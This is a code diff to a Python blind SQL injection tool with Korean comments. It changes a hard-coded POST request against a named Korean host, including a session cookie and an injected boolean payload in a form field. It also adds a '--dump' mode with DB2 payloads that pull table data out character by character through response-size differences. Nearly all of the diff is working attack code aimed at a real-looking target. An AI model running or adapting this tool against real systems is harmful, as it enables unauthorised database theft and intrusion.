@@ -10,7 +10,9 @@ from time import sleep
 
 warnings.filterwarnings('ignore')
 
-length = 1000
+length = 900
+max_row = 1000
+max_len = 20
 
 
 ########################################################################################################
@@ -45,22 +47,22 @@ length = 1000
 ############################################### POST 방식 ###############################################
 
 REQUEST_STRING = """
-POST /CCB/activity/dkreport_list.jsp?npage=1 HTTP/1.1
-Content-Length: 115
+POST /CCHB/activity/open_list.jsp?npage=1 HTTP/1.1
 Host: amtsdev.ccbk.co.kr
+Content-Length: 135
 Cache-Control: max-age=0
 Origin: http://amtsdev.ccbk.co.kr
 Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://amtsdev.ccbk.co.kr/CCB/activity/dkreport_list.jsp?npage=1
+Referer: http://amtsdev.ccbk.co.kr/CCHB/activity/open_list.jsp
 Accept-Encoding: gzip, deflate, br
-Accept-Language: ko,zh-TW;q=0.9,zh;q=0.8
-Cookie: JSESSIONID=0000E3fBunv9OPZd16WYRNWSAmn:-1
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: JSESSIONID=0000vXjC0pL7VrkqJGF1r_YDtCz:-1; wasi_userid=secmyid
 Connection: keep-alive
 
-npage=1&account_name=&startDt=&endDt=&dk_depart=&team_code=&site_code='+AND+1=2+--+&account_code=&item=&COND_WHERE=
+detailteam=&npage=1&startDt=&endDt=&account_code=&dept_code=&team_code=&rate_gubun=&item='||(case+when+1=2+then+'test'+else+'a'+end)||'
 """
 
 ########################################################################################################
@@ -110,7 +112,7 @@ class ArgumentProcessor:
         parser.add_argument("-C", dest="select_column", help="열 선택 -Ex) -C 'Blog', 'Heroes'(인용문 선택)")
         parser.add_argument("--dbms", dest="dbms", help="DBMS 선택 : MySQL, Oracle, MSSQL, PostgreSQL -Ex) -DBMS Oracle")
         parser.add_argument("--proxy", dest="proxy", help="대상 URL에 연결하려면 프록시를 사용하여 -Ex) -Proxy 127.0.0.1:8080")
-        parser.add_argument("--dump", action="store_true", help="데이터베이스 테이블 항목을 덤프합니다")
+        parser.add_argument("--dump", action="store_true", help="데이터베이스 컬럼 데이터를 덤프합니다")
 
         group.add_argument("--basic", action="store_true", help="기본 데이터베이스 정보를 추출하십시오")
         group.add_argument("--dbs", action="store_true", help="DBMS 데이터베이스 열거")
@@ -381,6 +383,15 @@ class BlindSQLInjector:
                         'columns': "ASCII(SUBSTR((SELECT name FROM (SELECT ROW_NUMBER() OVER(ORDER BY colno) r, name FROM sysibm.syscolumns WHERE tbcreator='{select_db}' AND tbname='{select_table}')tb WHERE tb.r={rows}),{substr_index},1))>{mid_val}"
                     }
                 }
+            elif self.args.dump:
+                print(f"{Colors.LIGHT_BLUE}{Colors.UNDERLINE} DB2 Data Dump from {self.args.select_db}.{self.args.select_table} {Colors.END}\n")
+                payloads = {
+                    'Dump': {
+                        'count': f"(SELECT COUNT(*) FROM {self.args.select_db}.{self.args.select_table})>{{mid_val}}",
+                        'len': f"(SELECT LENGTH({self.args.select_column}) FROM (SELECT ROW_NUMBER() OVER(ORDER BY {self.args.select_column}) r, {self.args.select_column} FROM {self.args.select_db}.{self.args.select_table})tb WHERE tb.r={{rows}})>{{mid_val}}",
+                        'dump': f"ASCII(SUBSTR((SELECT {self.args.select_column} FROM (SELECT ROW_NUMBER() OVER(ORDER BY {self.args.select_column}) r, {self.args.select_column} FROM {self.args.select_db}.{self.args.select_table})tb WHERE tb.r={{rows}}),{{substr_index}},1))>{{mid_val}}"
+                    }
+                }
 
                 
         elif dbms == 'mysql':
@@ -492,8 +503,7 @@ class BlindSQLInjector:
             if method == 'GET':
                 params = '&'.join([f"{key}={value}" for key, value in data_params.items()])
                 full_url = f"{self.args.schema}://{url}{path}?{params}"
-                response = requests.request(method, full_url, headers=headers, proxies=proxies, 
-                                          timeout=timeout, verify=False)
+                response = requests.request(method, full_url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
                 check_message_size = len(response.content)
                 
             else: 
@@ -505,8 +515,8 @@ class BlindSQLInjector:
                     
                 check_message_size = len(response.content)
             #응답 크기가 기준선과 다른 경우 true
-            test_check = (check_message_size - self.false_message_size)
-            print("응답 : " + str(check_message_size) + " 기준 : " + str(self.false_message_size) +  " 차이 : " + str(test_check))
+            # test_check = (check_message_size - self.false_message_size)
+            # print("응답 : " + str(check_message_size) + " 기준 : " + str(self.false_message_size) +  " 차이 : " + str(test_check))
             return (check_message_size - self.false_message_size) > length # 응답길이 - 기준길이 > 200 = True
             
         except requests.exceptions.RequestException as e:
@@ -532,6 +542,7 @@ class BlindSQLInjector:
         
         # 요청을 보내고 결과를 얻습니다
         bin_result = self.send_request(data_val)
+        sleep(1)
         # print(bin_result)
         
         # 기본 케이스 - 범위가 좁아지면 1
@@ -563,10 +574,10 @@ class BlindSQLInjector:
                 tmp2 = tmp.replace("'", "").strip()
                 select_tables.append(tmp2)
         
-        result_data = {}
+        result_data = {} # 
         
         # 각 테이블을 처리 (또는 열이 추출되지 않으면 기본값)
-        for select_table_one in select_tables:
+        for select_table_one in select_tables: # 
             name_tmp = []
             result_tmp = []
             data_len = 0
@@ -574,58 +585,83 @@ class BlindSQLInjector:
             # 행 카운트 결정 (기본 정보 제외)
             if not self.args.basic:
                 for key, value in result_payload.items():
-                    row_count = self.binary_search(0, 10, data, result_payload[key]['count'], None, None, self.args.select_db, select_table_one, None) # 행 카운트 
+                    row_count = self.binary_search(0, max_row, data, result_payload[key]['count'], None, None, self.args.select_db, select_table_one, None) # 행 카운트 
             else:
-                row_count = 1
+                row_count = 1 # basic은 1개
                 
-            print(f"{Colors.GREEN}[*] '{select_table_one}' Count: {str(row_count)}{Colors.END}" 
+            print(f"{Colors.GREEN}[*] '{select_table_one}' Count: {str(row_count)}{Colors.END}"
                   if select_table_one else f"{Colors.GREEN}[*] Record count: {str(row_count)}{Colors.END}")
-
+        ###### 테이블 행 위까지 
             # 각 행을 처리
-            for rows in range(0, row_count):
-                for key, value in result_payload.items():
-                    name_tmp.append(key)
-                    for key2, value2 in list(value.items())[1:]:  #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
-                        if key2 == 'len':
-                            # Oracle Rownum은 1에서 시작
-                            if self.args.dbms.lower() in ('oracle', 'db2'): # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
-                                rows += 1 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
-                            data_len = self.binary_search(0, 127, data, value2, None, rows, self.args.select_db, select_table_one, None) # 데이터 길이 결정
-                            print(f"[*] Length [{rows}]: {str(data_len)}")
-                        else:
-                            name_str = ""
-                            for substr_index in range(0, data_len): # 데이터 글자 수 만큼 반복
-                                char_code = self.binary_search(0, 127, data, value2, substr_index + 1, rows, self.args.select_db, select_table_one, None)
-                                name_str += chr(char_code)
-                                
-                            # SQLITE의 저장 결과
-                            data_type = "basic" if self.args.basic else "dbs" if self.args.dbs else "tables" if self.args.tables else "columns"
-                            self.db_manager.store_result(data_type, name_str, self.args.select_db, select_table_one, key)
-                            
-                            result_tmp.append(name_str)
-                            print(f"[+] ['{name_str}']")
+            if self.args.dump : # 여기서 행 레코드별로 데이터 출력 ()
+                columns = [col.strip().replace("'", "") for col in self.args.select_column.split(",")]
 
-                # 형식 및 최종 결과를 저장
-                if self.args.basic:
-                    num = 0
-                    for name in name_tmp:
-                        result_data[name] = result_tmp[num]
-                        num += 1
-                    print(f"{Colors.LIGHT_RED}[+] {result_data}{Colors.END}")
-                else:
-                    if select_table_one:
-                        result_data[select_table_one] = result_tmp
-                    else:
-                        result_data[list(name_tmp)[0]] = result_tmp
+                for row_idx in range(0, row_count):
+                    row_data = {}
+                    for column in columns:
+                        # 길이 측정
+                        data_len = self.binary_search(0, max_len, data, payloads['Dump']['len'], None, row_idx, self.args.select_db, self.args.select_table, column)
+                        value = ''
+                        for substr_index in range(0, data_len):
+                            char_code = self.binary_search(0, 127, data, payloads['Dump']['dump'], substr_index + 1, row_idx, self.args.select_db, self.args.select_table, column)
+                            value += chr(char_code)
+                        row_data[column] = value
 
-            if select_table_one:
-                print(f"{Colors.LIGHT_RED}[+] '{select_table_one}': {result_data[select_table_one]}{Colors.END}")
+                        # DB 저장
+                        self.db_manager.cursor.execute(
+                            "INSERT INTO data_dump (db_name, table_name, column_name, row_index, data) VALUES (?, ?, ?, ?, ?)",
+                            (self.args.select_db, self.args.select_table, column, row_idx, value)
+                        )
+                        self.db_manager.conn.commit()
+
+                    print(f"[+] Row {row_idx} → {row_data}")
+
+
             else:
-                if not self.args.basic:
-                    first_name = list(name_tmp)[0]
-                    print(f"{Colors.LIGHT_RED}[+] '{first_name}' data: {result_data[first_name]}{Colors.END}")
-                                            
-                    result_tmp = []  # 다음 테이블에 대한 재설정
+                for rows in range(0, row_count):
+                    for key, value in result_payload.items():
+                        name_tmp.append(key)
+                        for key2, value2 in list(value.items())[1:]:  #딕셔너리를 리스트로 변환 후 첫번째 값(count)는 제외하고 실행 
+                            if key2 == 'len':
+                                # Oracle Rownum은 1에서 시작
+                                if self.args.dbms.lower() in ('oracle', 'db2'): # 오라클일 경우 rownum은 1부터 시작하기에 + 1 해야됨
+                                    rows += 1 # 길이를 구하고 이름을 뽑고하는 방식이기 때문에 길이를 구할때만 +1하면됨
+                                data_len = self.binary_search(0, max_len, data, value2, None, rows, self.args.select_db, select_table_one, None) # 데이터 길이 결정
+                                print(f"[*] Length [{rows}]: {str(data_len)}")
+                            else:
+                                name_str = ""
+                                for substr_index in range(0, data_len): # 데이터 글자 수 만큼 반복
+                                    char_code = self.binary_search(0, 127, data, value2, substr_index + 1, rows, self.args.select_db, select_table_one, None)
+                                    name_str += chr(char_code)
+                                    
+                                # SQLITE의 저장 결과
+                                data_type = "basic" if self.args.basic else "dbs" if self.args.dbs else "tables" if self.args.tables else "columns"
+                                self.db_manager.store_result(data_type, name_str, self.args.select_db, select_table_one, key)
+                                
+                                result_tmp.append(name_str)
+                                print(f"[+] ['{name_str}']")
+                
+                    # 형식 및 최종 결과를 저장
+                    if self.args.basic:
+                        num = 0
+                        for name in name_tmp:
+                            result_data[name] = result_tmp[num]
+                            num += 1
+                        print(f"{Colors.LIGHT_RED}[+] {result_data}{Colors.END}")
+                    else:
+                        if select_table_one:
+                            result_data[select_table_one] = result_tmp
+                        else:
+                            result_data[list(name_tmp)[0]] = result_tmp
+
+                if select_table_one:
+                    print(f"{Colors.LIGHT_RED}[+] '{select_table_one}': {result_data[select_table_one]}{Colors.END}")
+                else:
+                    if not self.args.basic:
+                        first_name = list(name_tmp)[0]
+                        print(f"{Colors.LIGHT_RED}[+] '{first_name}' data: {result_data[first_name]}{Colors.END}")
+                                                
+                        result_tmp = []  # 다음 테이블에 대한 재설정
 
         # 최종 결과를 표시
         print(f"\n{Colors.LIGHT_BLUE}[+] Final Results{Colors.END}")
